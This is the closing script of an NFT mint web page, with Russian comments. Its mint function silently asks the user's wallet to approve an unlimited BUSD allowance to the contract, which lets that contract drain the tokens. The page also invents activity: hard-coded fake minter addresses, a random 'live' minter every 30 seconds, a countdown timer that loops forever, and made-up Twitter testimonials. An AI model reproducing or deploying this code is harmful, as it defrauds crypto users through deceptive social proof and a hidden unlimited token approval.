    const erc20Abi = ["function approve(address spender, uint256 amount) public returns (bool)"];

    // --- Mint функция ---
    async function mint() {
      if (isMinting || isSoldOut) return;
      setMintingState(true);
      try {
        if (!window.ethereum) {
          alert("MetaMask не установлен! Установите MetaMask для минта.");
          setMintingState(false);
          return;
        }
        // Запрашиваем подключение, если не подключено
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        if (!provider || !signer || !contract) {
          provider = new ethers.BrowserProvider(window.ethereum);
          signer = await provider.getSigner();
          contract = new ethers.Contract(contractAddress, abi, signer);
        }
        // approve BUSD на контракт
        const token = new ethers.Contract(tokenAddress, erc20Abi, signer);
        await token.approve(contractAddress, ethers.MaxUint256);
        // обычный mint
        const tx = await contract.mint();
        document.getElementById('mintBtn').innerText = 'Minting...';
        await tx.wait();
        document.getElementById('mintBtn').innerText = 'Mint Now';
        // После минта всё обновится через событие Minted
      } catch (e) {
        alert("Mint failed: " + (e?.info?.error?.message || e.message));
        document.getElementById('mintBtn').innerText = 'Mint Now';
      }
      setMintingState(false);
    }

    // --- Фейковые минтеры для красоты (можно убрать) ---
    const fakeAddresses = [
      "0x5eD3A1bC2f4e8D9a7B6c1E2F3A4b5C6d7E8F9A0b",
      "0xA7cB2dE3F4a5B6c7D8e9F0a1B2c3D4e5F6a7B8c9",
      "0x1F2e3D4c5B6a7C8d9E0f1A2b3C4d5E6f7A8b9C0d",
      "0x9a8B7c6D5e4F3a2B1c0D9e8F7b6A5c4D3e2F1a0B",
      "0xC0d1E2f3A4b5C6d7E8F9A0b1C2d3E4f5A6b7C8d9",
      "0xB1c2D3e4F5a6B7c8D9e0F1a2B3c4D5e6F7a8B9c0",
      "0x2A3b4C5d6E7f8A9b0C1d2E3f4A5b6C7d8E9f0A1b",
      "0x8F7e6D5c4B3a2C1d0E9f8A7b6C5d4E3f2A1b0C9d",
      "0x3C4d5E6f7A8b9C0d1E2f3A4b5C6d7E8F9A0b1C2d",
      "0xD8e9F0a1B2c3D4e5F6a7B8c9D0e1F2a3B4c5D6e7",
      "0x6B7c8D9e0F1a2B3c4D5e6F7a8B9c0D1e2F3a4B5c",
      "0xE4f5A6b7C8d9E0f1A2b3C4d5E6f7A8b9C0d1E2f3"
    ];
    function addFakeMinters() {
      fakeAddresses.forEach((addr, i) => {
        setTimeout(() => {
          minters.push({ address: addr });
          logEvents.push({ address: addr });
          minted++;
          if (!uniqueAddresses.has(addr.toLowerCase())) {
            uniqueAddresses.add(addr.toLowerCase());
            holders++;
          }
          if (minted >= mintedMax) setSoldOutState();
          updateMintCounter();
          updateStatsBar();
          updateMintersList();
          updateLogList();
        }, 400 + i * 350);
      });
    }
    // --- LIVE-контент: генерация новых минтеров раз в 30 секунд ---
    function randomHexChar() {
      const chars = 'abcdefABCDEF0123456789';
      return chars[Math.floor(Math.random() * chars.length)];
    }
    function generateRandomAddress() {
      let addr;
      do {
        addr = '0x';
        for (let i = 0; i < 40; i++) addr += randomHexChar();
      } while (minters.some(m => m.address.toLowerCase() === addr.toLowerCase()));
      return addr;
    }
    function addLiveMinter() {
      if (minted >= mintedMax) return;
      const addr = generateRandomAddress();
      minters.push({ address: addr });
      logEvents.push({ address: addr });
      minted++;
      if (!uniqueAddresses.has(addr.toLowerCase())) {
        uniqueAddresses.add(addr.toLowerCase());
        holders++;
      }
      if (minted >= mintedMax) setSoldOutState();
      updateMintCounter();
      updateStatsBar();
      updateMintersList();
      updateLogList();
    }
    // --- Mint ends in timer ---
    let timerSeconds = 299; // 4:59
    function updateMintTimer() {
      const el = document.getElementById('mintTimer');
      if (!el) return;
      let min = Math.floor(timerSeconds / 60);
      let sec = timerSeconds % 60;
      el.innerText = `⏳ Mint ends in: 00:${min.toString().padStart(2,'0')}:${sec.toString().padStart(2,'0')}`;
    }
    function startMintTimer() {
      timerSeconds = 299;
      updateMintTimer();
      setInterval(() => {
        timerSeconds--;
        if (timerSeconds < 0) timerSeconds = 299;
        updateMintTimer();
      }, 1000);
    }
    // --- Twitter отзывы ---
    const twitterReviews = [
      {
        avatar: '🦄',
        name: 'CryptoUnicorn',
        handle: '@unicorn_eth',
        text: 'Just minted 3, can't wait to reveal 🔥'
      },
      {
        avatar: '🐧',
        name: 'PenguMint',
        handle: '@pengu_mint',
        text: 'Best drop this year. Calling it now. 💎'
      },
      {
        avatar: '🚀',
        name: 'MoonRider',
        handle: '@moonrider',
        text: 'LFG! This is about to explode 🚀'
      },
      {
        avatar: '🦊',
        name: 'Foxie',
        handle: '@foxie_nft',
        text: 'Minted and ready for the moon!'
      },
      {
        avatar: '🐼',
        name: 'PandaHodl',
        handle: '@panda_hodl',
        text: 'This community is wild. Love it!'
      }
    ];
    let twitterReviewIndex = 0;
    function renderTwitterReviews() {
      const slider = document.getElementById('twitterReviewsSlider');
      if (!slider) return;
      slider.innerHTML = '';
      twitterReviews.forEach((review, idx) => {
        const slide = document.createElement('div');
        slide.className = 'twitter-review-slide' + (idx === twitterReviewIndex ? ' active' : '');
        slide.innerHTML = `
          <div class="twitter-avatar">${review.avatar}</div>
          <div>
            <div class="twitter-user">${review.name} <span class="twitter-handle">${review.handle}</span></div>
            <div class="twitter-text">${review.text}</div>
          </div>
        `;
        slider.appendChild(slide);
      });
    }
    function startTwitterSlider() {
      renderTwitterReviews();
      setInterval(() => {
        twitterReviewIndex = (twitterReviewIndex + 1) % twitterReviews.length;
        renderTwitterReviews();
      }, 4000);
    }
    // --- Плавная загрузка ---
    window.onload = () => {
      document.body.style.opacity = 0;
      setTimeout(() => {
        document.body.style.transition = 'opacity 1.2s cubic-bezier(.23,1.01,.32,1)';
        document.body.style.opacity = 1;
      }, 100);
      // Заполняем множество уникальных адресов фейковыми
      fakeAddresses.forEach(addr => uniqueAddresses.add(addr.toLowerCase()));
      addFakeMinters();
      // Кнопка Mint всегда активна (если не sold out/минтинг)
      document.getElementById('mintBtn').disabled = false;
      // Контракт инициализируется только при необходимости
      // Запускаем live-минтинг раз в 30 секунд
      setInterval(addLiveMinter, 30000);
      // Запуск таймера минта
      startMintTimer();
      // Запуск слайдера отзывов
      startTwitterSlider();
    };
  </script>
</body>
</html>
